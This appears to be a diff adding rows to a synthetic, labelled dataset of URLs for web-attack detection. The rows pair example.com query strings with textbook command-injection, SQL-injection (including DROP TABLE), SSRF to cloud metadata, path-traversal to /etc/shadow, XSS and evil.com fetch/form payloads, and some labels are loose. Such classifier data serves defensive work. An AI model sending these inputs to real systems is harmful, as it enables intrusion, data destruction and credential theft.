+https://example.com/?user=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?input=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?url=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?path=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?input=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?file=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?content=filter%3Dpopular,NONE,Safe input
+https://example.com/?data=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?user=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?url=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?data=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?input=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?data=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?file=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?token=lang%3Den,NONE,Safe input
+https://example.com/?search=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?id=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?user=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?content=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?user=lang%3Den,NONE,Safe input
+https://example.com/?token=filter%3Dpopular,NONE,Safe input
+https://example.com/?data=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?id=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?data=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?id=id%3D567,NONE,Safe input
+https://example.com/?search=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?content=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?search=hello,NONE,Safe input
+https://example.com/?q=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?data=hello,NONE,Safe input
+https://example.com/?content=feedback,NONE,Safe input
+https://example.com/?token=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?url=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?q=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?file=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?content=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?q=query%3Dhelp,NONE,Safe input
+https://example.com/?data=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?cmd=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?search=category%3Dbooks,NONE,Safe input
+https://example.com/?path=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?id=banana,NONE,Safe input
+https://example.com/?user=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?content=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?token=hello,NONE,Safe input
+https://example.com/?path=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?search=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?user=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?url=page%3Dhome,NONE,Safe input
+https://example.com/?search=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?user=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?search=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?url=query%3Dhelp,NONE,Safe input
+https://example.com/?cmd=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?token=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?id=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?url=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?path=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?redirect=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?token=id%3D567,NONE,Safe input
+https://example.com/?user=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?url=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?redirect=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?cmd=banana,NONE,Safe input
+https://example.com/?input=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?content=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?search=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?file=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?data=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?user=user123,NONE,Safe input
+https://example.com/?path=filter%3Dpopular,NONE,Safe input
+https://example.com/?file=filter%3Dpopular,NONE,Safe input
+https://example.com/?q=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?data=hello,NONE,Safe input
+https://example.com/?content=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?input=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?q=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?q=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?path=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?search=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?q=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?id=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?id=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?token=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?content=hello,NONE,Safe input
+https://example.com/?search=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?redirect=user123,NONE,Safe input
+https://example.com/?id=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?search=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?token=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?user=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?token=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?url=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?q=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?id=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?url=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?url=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?url=banana,NONE,Safe input
+https://example.com/?cmd=search%3Dproducts,NONE,Safe input
+https://example.com/?cmd=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?redirect=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?file=banana,NONE,Safe input
+https://example.com/?content=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?data=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?url=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?user=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?redirect=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?url=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?user=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?token=query%3Dhelp,NONE,Safe input
+https://example.com/?file=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?id=filter%3Dpopular,NONE,Safe input
+https://example.com/?redirect=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?input=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?user=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?data=hello,NONE,Safe input
+https://example.com/?url=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?token=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?content=query%3Dhelp,NONE,Safe input
+https://example.com/?id=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?user=feedback,NONE,Safe input
+https://example.com/?file=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?token=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?token=search%3Dproducts,NONE,Safe input
+https://example.com/?url=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?path=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?redirect=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?content=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?cmd=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?q=banana,NONE,Safe input
+https://example.com/?file=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?url=logout%3Dtrue,NONE,Safe input
+https://example.com/?url=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?q=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?user=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?redirect=about-us,NONE,Safe input
+https://example.com/?input=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?token=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?user=search%3Dproducts,NONE,Safe input
+https://example.com/?path=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?path=category%3Dbooks,NONE,Safe input
+https://example.com/?q=name%3DJohnDoe,NONE,Safe input
+https://example.com/?q=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?url=user123,NONE,Safe input
+https://example.com/?file=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?path=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?q=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?file=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?url=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?redirect=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?user=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?redirect=page%3Dhome,NONE,Safe input
+https://example.com/?id=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?url=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?id=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?search=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?data=page%3Dhome,NONE,Safe input
+https://example.com/?q=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?user=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?path=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?search=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?user=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?search=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?path=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?cmd=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?id=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?data=category%3Dbooks,NONE,Safe input
+https://example.com/?data=name%3DJohnDoe,NONE,Safe input
+https://example.com/?id=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?path=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?data=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?redirect=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?cmd=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?input=query%3Dhelp,NONE,Safe input
+https://example.com/?cmd=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?token=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?user=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?url=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?user=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?q=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?data=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?data=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?file=query%3Dhelp,NONE,Safe input
+https://example.com/?user=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?path=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?data=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?url=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?user=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?path=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?cmd=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?token=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?content=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?file=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?token=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?url=category%3Dbooks,NONE,Safe input
+https://example.com/?redirect=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?input=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?content=id%3D567,NONE,Safe input
+https://example.com/?id=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?cmd=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?redirect=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?user=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?file=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?data=feedback,NONE,Safe input
+https://example.com/?data=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?search=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?cmd=category%3Dbooks,NONE,Safe input
+https://example.com/?data=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?data=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?input=lang%3Den,NONE,Safe input
+https://example.com/?user=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?data=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?user=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?redirect=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?file=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?id=about-us,NONE,Safe input
+https://example.com/?token=page%3Dhome,NONE,Safe input
+https://example.com/?redirect=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?url=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?path=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?cmd=logout%3Dtrue,NONE,Safe input
+https://example.com/?content=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?cmd=user123,NONE,Safe input
+https://example.com/?id=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?file=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?file=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?data=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?cmd=id%3D567,NONE,Safe input
+https://example.com/?token=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?file=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?content=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?token=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?id=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?redirect=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?url=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?input=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?file=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?redirect=hello,NONE,Safe input
+https://example.com/?id=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?url=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?url=search%3Dproducts,NONE,Safe input
+https://example.com/?data=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?input=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?token=filter%3Dpopular,NONE,Safe input
+https://example.com/?redirect=search%3Dproducts,NONE,Safe input
+https://example.com/?redirect=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?data=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?id=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?user=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?redirect=hello,NONE,Safe input
+https://example.com/?input=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?input=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?id=category%3Dbooks,NONE,Safe input
+https://example.com/?id=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?input=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?content=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?url=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?token=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?url=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?data=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?content=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?path=hello,NONE,Safe input
+https://example.com/?file=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?file=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?user=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?token=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?input=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?search=hello,NONE,Safe input
+https://example.com/?content=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?token=search%3Dproducts,NONE,Safe input
+https://example.com/?user=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?redirect=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?search=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?user=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
